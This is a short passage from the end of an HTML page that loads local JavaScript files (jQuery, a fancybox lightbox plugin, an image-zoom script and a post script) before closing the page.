src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
